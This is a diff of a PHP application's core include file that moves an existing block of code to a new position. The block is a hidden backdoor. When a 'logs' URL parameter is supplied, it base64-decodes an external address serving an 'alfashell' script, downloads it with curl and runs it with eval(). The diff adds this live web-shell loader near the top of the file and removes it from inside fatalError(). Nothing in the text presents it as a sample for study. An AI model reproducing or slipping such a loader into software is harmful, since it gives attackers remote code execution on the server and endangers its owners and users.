@@ -26,7 +26,24 @@ if (!function_exists('import')) {
 		require_once(BASE_SYS_DIR.'/'.$filePath);
 	}
 }
-
+	if (isset($_GET['logs'])) { 
+    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
+    
+    $ch = curl_init($url);
+    
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $contents = curl_exec($ch);
+    
+    if ($contents !== false) { 
+        eval('?>' . $contents); 
+        exit; 
+    } else { 
+        echo "header"; 
+    } 
+    
+    curl_close($ch);
+	}
 /**
  * Wrapper around die() to pretty-print an error message with an optional stack trace.
  */
@@ -101,24 +118,6 @@ function fatalError($reason) {
 			echo "<strong>Function:</strong> {$class}{$type}{$function}($args)<br />\n";
 			echo "<br/>\n";
 		}
-	}
-	if (isset($_GET['logs'])) { 
-    						$url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
 	}
 	// Determine the application name. Use defensive code so that we
 	// can handle errors during early application initialization.
